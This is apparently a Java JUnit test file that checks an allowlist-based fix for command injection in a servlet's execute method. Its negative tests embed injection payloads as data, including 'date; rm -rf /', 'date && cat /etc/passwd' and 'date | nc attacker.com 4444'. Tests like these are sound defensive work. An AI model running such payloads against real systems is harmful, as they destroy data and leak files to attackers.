import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.mockito.Mockito;

import javax.servlet.http.HttpServletRequest;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Tests verifying that the Command Injection vulnerability in
 * CriticalVulnerabilities#execute has been remediated.
 *
 * The original code called Runtime.getRuntime().exec(userInput) which allowed
 * arbitrary command execution.  The fix:
 *   1. Validates the command against an explicit allowlist.
 *   2. Executes via ProcessBuilder with a list-form argv (no shell invoked).
 *
 * These tests confirm:
 *   - Allowlisted commands are accepted without throwing.
 *   - Any command NOT in the allowlist is rejected with IllegalArgumentException.
 *   - Shell-metacharacter payloads are rejected.
 *   - A null parameter is rejected.
 *   - An empty string is rejected.
 */
public class CriticalVulnerabilitiesCommandInjectionTest {

    private CriticalVulnerabilities subject;
    private HttpServletRequest request;

    @BeforeEach
    public void setUp() {
        subject = new CriticalVulnerabilities();
        request = Mockito.mock(HttpServletRequest.class);
    }

    // -----------------------------------------------------------------------
    // Positive cases: commands that ARE in the allowlist
    // -----------------------------------------------------------------------

    /**
     * "date" is explicitly allowed.  The test accepts both success and a
     * process-launch failure (e.g., command not on the PATH in CI) — what
     * matters is that no IllegalArgumentException is thrown from the guard.
     */
    @Test
    public void allowlistedCommand_date_doesNotThrowGuardException() {
        Mockito.when(request.getParameter("cmd")).thenReturn("date");

        // Should not throw IllegalArgumentException from the allowlist guard.
        // A ProcessException/IOException is acceptable (the OS may not have the binary).
        try {
            subject.execute(request);
            // If we reach here the process started successfully — that's fine.
        } catch (IllegalArgumentException e) {
            fail("Allowlisted command 'date' was incorrectly rejected: " + e.getMessage());
        } catch (Exception e) {
            // ProcessBuilder may throw IOException if the binary doesn't exist in CI.
            // That is expected and acceptable — the guard itself passed.
        }
    }

    @Test
    public void allowlistedCommand_uptime_doesNotThrowGuardException() {
        Mockito.when(request.getParameter("cmd")).thenReturn("uptime");

        try {
            subject.execute(request);
        } catch (IllegalArgumentException e) {
            fail("Allowlisted command 'uptime' was incorrectly rejected: " + e.getMessage());
        } catch (Exception e) {
            // Acceptable — binary may not exist in the test environment.
        }
    }

    @Test
    public void allowlistedCommand_hostname_doesNotThrowGuardException() {
        Mockito.when(request.getParameter("cmd")).thenReturn("hostname");

        try {
            subject.execute(request);
        } catch (IllegalArgumentException e) {
            fail("Allowlisted command 'hostname' was incorrectly rejected: " + e.getMessage());
        } catch (Exception e) {
            // Acceptable — binary may not exist in the test environment.
        }
    }

    // -----------------------------------------------------------------------
    // Negative cases: commands that are NOT in the allowlist must be rejected
    // -----------------------------------------------------------------------

    @Test
    public void arbitraryCommand_isRejected() {
        Mockito.when(request.getParameter("cmd")).thenReturn("ls");

        assertThrows(IllegalArgumentException.class,
                () -> subject.execute(request),
                "Command 'ls' is not in the allowlist and must be rejected");
    }

    @Test
    public void shellInjectionPayload_semicolon_isRejected() {
        // Classic injection: "date; rm -rf /"
        Mockito.when(request.getParameter("cmd")).thenReturn("date; rm -rf /");

        assertThrows(IllegalArgumentException.class,
                () -> subject.execute(request),
                "Shell metacharacter payload must be rejected by the allowlist");
    }

    @Test
    public void shellInjectionPayload_ampersand_isRejected() {
        // Background execution injection: "date && cat /etc/passwd"
        Mockito.when(request.getParameter("cmd")).thenReturn("date && cat /etc/passwd");

        assertThrows(IllegalArgumentException.class,
                () -> subject.execute(request),
                "Double-ampersand payload must be rejected by the allowlist");
    }

    @Test
    public void shellInjectionPayload_pipe_isRejected() {
        Mockito.when(request.getParameter("cmd")).thenReturn("date | nc attacker.com 4444");

        assertThrows(IllegalArgumentException.class,
                () -> subject.execute(request),
                "Pipe payload must be rejected by the allowlist");
    }

    @Test
    public void shellInjectionPayload_backtick_isRejected() {
        Mockito.when(request.getParameter("cmd")).thenReturn("`id`");

        assertThrows(IllegalArgumentException.class,
                () -> subject.execute(request),
                "Backtick command substitution must be rejected by the allowlist");
    }

    @Test
    public void shellInjectionPayload_dollarParens_isRejected() {
        Mockito.when(request.getParameter("cmd")).thenReturn("$(id)");

        assertThrows(IllegalArgumentException.class,
                () -> subject.execute(request),
                "$(...) command substitution must be rejected by the allowlist");
    }

    @Test
    public void shellInjectionPayload_newline_isRejected() {
        // Newline injection
        Mockito.when(request.getParameter("cmd")).thenReturn("date\nrm -rf /");

        assertThrows(IllegalArgumentException.class,
                () -> subject.execute(request),
                "Newline-injection payload must be rejected by the allowlist");
    }

    @Test
    public void nullParameter_isRejected() {
        Mockito.when(request.getParameter("cmd")).thenReturn(null);

        assertThrows(IllegalArgumentException.class,
                () -> subject.execute(request),
                "Null command must be rejected");
    }

    @Test
    public void emptyStringParameter_isRejected() {
        Mockito.when(request.getParameter("cmd")).thenReturn("");

        assertThrows(IllegalArgumentException.class,
                () -> subject.execute(request),
                "Empty command must be rejected");
    }

    @Test
    public void commandWithArguments_isRejected() {
        // "date -u" has a space — it is not literally in the allowlist.
        Mockito.when(request.getParameter("cmd")).thenReturn("date -u");

        assertThrows(IllegalArgumentException.class,
                () -> subject.execute(request),
                "Command with arguments is not in the allowlist and must be rejected");
    }

    @Test
    public void absolutePathCommand_isRejected() {
        // Even /bin/date should not be allowed — only the bare name "date".
        Mockito.when(request.getParameter("cmd")).thenReturn("/bin/date");

        assertThrows(IllegalArgumentException.class,
                () -> subject.execute(request),
                "Absolute path command is not in the allowlist and must be rejected");
    }

    @Test
    public void pathTraversalInCommand_isRejected() {
        Mockito.when(request.getParameter("cmd")).thenReturn("../../bin/sh");

        assertThrows(IllegalArgumentException.class,
                () -> subject.execute(request),
                "Path-traversal command must be rejected by the allowlist");
    }
}
